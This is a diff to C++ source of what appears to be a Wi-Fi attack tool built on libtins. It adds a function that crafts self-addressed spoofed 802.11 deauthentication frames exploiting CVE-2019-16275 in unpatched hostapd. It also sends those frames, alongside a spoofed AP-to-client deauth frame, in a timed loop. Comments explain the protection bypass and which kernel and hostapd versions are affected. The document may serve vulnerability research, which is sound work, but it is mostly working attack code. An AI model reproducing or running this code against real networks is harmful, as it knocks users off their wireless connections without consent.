@@ -18,7 +18,6 @@ using namespace Tins;
 using namespace chrono;
 
 // CVE-2019-16275 / hostapd advisory 2019-7
-//TODO test on version < 3 linux distros
 // Deauth FROM AP TO client
 // client with PMF receives it as NL80211_CMD_UNPROT_DEAUTHENTICATE sme_event_unprot_disconnect checks SA==BSSID + reason==CLASS3 -> triggers SA Query.
 // Unpatched AP (hostapd < 2.10) does not validate SA of received frames, so an attacker can spoof SA=AP_MAC
@@ -28,6 +27,24 @@ RadioTap make_deauth(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac) {
 	Dot11Deauthentication frame(sta_mac, ap_mac);
 	frame.addr3(ap_mac);  // BSSID
 	frame.reason_code(7); // CLASS3_FRAME_FROM_NONASSOC_STA - required by sme_event_unprot_disconnect
+	RadioTap rt{};
+	rt.inner_pdu(frame);
+	return rt;
+}
+
+// CVE-2019-16275 (w1.fi/security/2019-7) "AP mode PMF disconnection protection bypass"
+// deauth addressed TO the AP with SA=AP_MAC (self-addressed).
+// - on OLD kernels (~4.x, 2019 era): mac80211 passes the frame to hostapd; unpatched hostapd 2.9
+//   processes it in a way that triggers nl80211 INTERFACE-DISABLED, breaking the client's SA Query
+// - on MODERN kernels (5.x+): mac80211 appears to filter SA=own_addr frames before they reach
+//   hostapd, so INTERFACE-DISABLED is never triggered regardless of hostapd version.
+//   The hostapd 2.10 patch (silently drop SA==own_addr before processing) is therefore
+//   defence-in-depth for older kernels that still pass the frame through.
+// -> reproducible only on old kernels with unpatched hostapd 2.9; kernel 7.x tested: not triggered
+RadioTap make_cve_deauth(const HWAddress<6> &ap_mac) {
+	Dot11Deauthentication frame(ap_mac, ap_mac); // DA=AP, SA=AP (self-addressed)
+	frame.addr3(ap_mac);
+	frame.reason_code(7);
 	RadioTap rt{};
 	rt.inner_pdu(frame);
 	return rt;
@@ -51,9 +68,11 @@ void run_attack(RunStatus &rs) {
 	log(LogLevel::INFO, "Deauth attack START");
 	PacketSender sender{ iface };
 	RadioTap frame = make_deauth(ap_mac, sta_mac);
+	RadioTap cve_frame = make_cve_deauth(ap_mac);
 	const auto end = steady_clock::now() + seconds(att_cfg.at("attack_time"));
 	while(steady_clock::now() < end) {
 		sender.send(frame);
+		sender.send(cve_frame);
 		interruptible_sleep(milliseconds(att_cfg.at("ms_interval")));
 	}
 	log(LogLevel::INFO, "Deauth attack END");
